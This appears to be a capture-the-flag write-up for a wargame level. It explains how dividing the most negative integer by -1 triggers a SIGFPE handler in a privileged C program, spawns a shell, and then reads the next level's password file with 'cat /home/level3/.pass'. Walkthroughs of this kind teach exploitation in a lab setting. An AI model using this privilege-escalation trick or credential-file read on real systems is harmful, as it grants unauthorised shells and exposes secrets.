---
custom_edit_url: null
sidebar_position: 2
---

## Source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
    setresuid(geteuid(),geteuid(),geteuid());
    printf("WIN!\n");
    system("/bin/sh");
    exit(0);
}

int main(int argc, char **argv)
{
	puts("source code is available in level02.c\n");

    if (argc != 3 || !atoi(argv[2]))
        return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
}
```
The `catcher()` function is what we want to call.

The `main()` function returns the division of the second and third argument, first being the program name itself.

The program makes `signal` syscall which sets a handler function for a signal. This handle function gets called when the signal is received.
```c
sighandler_t signal(int signum, sighandler_t _handler);
```
In our case the signal is `SIGFPE` and the handler function is `catcher()`.
If we look at the man-page, it tells us when a `SIGFPE` signal is generated.
```
Integer division by zero has undefined result.  On some architectures it will generate a SIGFPE signal.  
(Also dividing the most negative integer by -1 may generate **SIGFPE**.)
```
So `SIGFPE` is generated during divisions, and there is a division occurring in our program.

We cannot perform division by zero because our `argv[2]` is the divisor and the program doesn't allow for it to be zero.
However, `argv[2]` can be -1. Which means we just have to figure out what the most negative integer is and pass it as `argv[1]`
```
level2@io:/levels$ ./level02 -4294967296 -1
source code is available in level02.c

WIN!
sh-4.3$
```
We can cat the password for the next level now.
```
sh-4.3$ cat /home/level3/.pass
```
